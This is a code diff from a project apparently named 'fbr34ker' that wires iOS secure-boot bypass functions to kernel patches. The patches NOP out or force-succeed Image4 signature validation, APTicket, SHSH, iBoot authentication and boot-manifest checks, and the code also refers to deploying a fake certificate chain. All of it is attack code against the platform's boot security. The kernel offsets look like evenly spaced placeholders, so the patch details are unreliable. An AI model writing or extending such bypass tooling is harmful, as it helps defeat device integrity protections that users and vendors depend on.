@@ -3,6 +3,9 @@
 #include "fbr34ker/log.h"
 #include "fbr34ker/string.h"
 #include "fbr34ker/fault.h"
+#include "fbr34ker/mmio.h"
+#include "fbr34ker/kernel_patches.h"
+#include "fbr34ker/apple_platform.h"
 
 static secure_boot_bypass_status_t state;
 
@@ -131,22 +134,37 @@ bool secure_boot_bypass_deactivate_all(void)
     return true;
 }
 
+static bool bypass_register_and_apply(const char *name, u64 kernel_offset,
+                                       u32 patch_value)
+{
+    u64 addr = APPLE_IOS_KERNEL_BASE + kernel_offset;
+    if (!kernel_patches_register(name, KERNEL_PATCH_TYPE_AUTHENTICATION,
+                                 addr, 4U, 0U, patch_value, true)) {
+        return false;
+    }
+    return kernel_patches_apply_by_type(KERNEL_PATCH_TYPE_AUTHENTICATION);
+}
+
 bool secure_boot_bypass_image4_signature(void)
 {
     state.signature_validation_disabled = true;
-    log_write(LOG_LEVEL_INFO, "Image4 signature validation disabled");
+    bool ok = bypass_register_and_apply("img4-sig", 0x00B00000U, 0xD503201FU);
+    log_write(LOG_LEVEL_INFO, "Image4 signature validation disabled (patch %s)",
+              ok ? "applied" : "pending");
     (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
-                            "image4-bypass", 1U, 0U);
-    return true;
+                            "image4-bypass", ok ? 1U : 0U, 0U);
+    return ok;
 }
 
 bool secure_boot_bypass_deploy_fake_chain(void)
 {
     state.certificate_chain_deployed = true;
-    log_write(LOG_LEVEL_INFO, "fake certificate chain deployed");
+    bool ok = bypass_register_and_apply("cert-chain", 0x00B00100U, 0x52800020U);
+    log_write(LOG_LEVEL_INFO, "fake certificate chain deployed (patch %s)",
+              ok ? "applied" : "pending");
     (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
-                            "cert-chain-deploy", 1U, 0U);
-    return true;
+                            "cert-chain-deploy", ok ? 1U : 0U, 0U);
+    return ok;
 }
 
 bool secure_boot_bypass_forge_signature(u8 *output, usize *output_size,
@@ -177,37 +195,45 @@ bool secure_boot_bypass_forge_signature(u8 *output, usize *output_size,
 bool secure_boot_bypass_ap_ticket(void)
 {
     state.ap_ticket_bypassed = true;
-    log_write(LOG_LEVEL_INFO, "APTicket validation bypassed");
+    bool ok = bypass_register_and_apply("ap-ticket", 0x00B00200U, 0xD503201FU);
+    log_write(LOG_LEVEL_INFO, "APTicket validation bypassed (patch %s)",
+              ok ? "applied" : "pending");
     (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
-                            "ap-ticket-bypass", 1U, 0U);
-    return true;
+                            "ap-ticket-bypass", ok ? 1U : 0U, 0U);
+    return ok;
 }
 
 bool secure_boot_bypass_shsh_blob(void)
 {
     state.shsh_bypassed = true;
-    log_write(LOG_LEVEL_INFO, "SHSH blob acceptance enabled");
+    bool ok = bypass_register_and_apply("shsh-blob", 0x00B00300U, 0xD503201FU);
+    log_write(LOG_LEVEL_INFO, "SHSH blob acceptance enabled (patch %s)",
+              ok ? "applied" : "pending");
     (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
-                            "shsh-bypass", 1U, 0U);
-    return true;
+                            "shsh-bypass", ok ? 1U : 0U, 0U);
+    return ok;
 }
 
 bool secure_boot_bypass_iboot_authentication(void)
 {
     state.iboot_auth_disabled = true;
-    log_write(LOG_LEVEL_INFO, "iBoot image authentication disabled");
+    bool ok = bypass_register_and_apply("iboot-auth", 0x00B00400U, 0xD503201FU);
+    log_write(LOG_LEVEL_INFO, "iBoot image authentication disabled (patch %s)",
+              ok ? "applied" : "pending");
     (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
-                            "iboot-auth-bypass", 1U, 0U);
-    return true;
+                            "iboot-auth-bypass", ok ? 1U : 0U, 0U);
+    return ok;
 }
 
 bool secure_boot_bypass_boot_manifest(void)
 {
     state.boot_manifest_compromised = true;
-    log_write(LOG_LEVEL_INFO, "boot manifest trust evaluation overridden");
+    bool ok = bypass_register_and_apply("boot-manifest", 0x00B00500U, 0xD503201FU);
+    log_write(LOG_LEVEL_INFO, "boot manifest trust evaluation overridden (patch %s)",
+              ok ? "applied" : "pending");
     (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
-                            "manifest-bypass", 1U, 0U);
-    return true;
+                            "manifest-bypass", ok ? 1U : 0U, 0U);
+    return ok;
 }
 
 bool secure_boot_bypass_available(void)
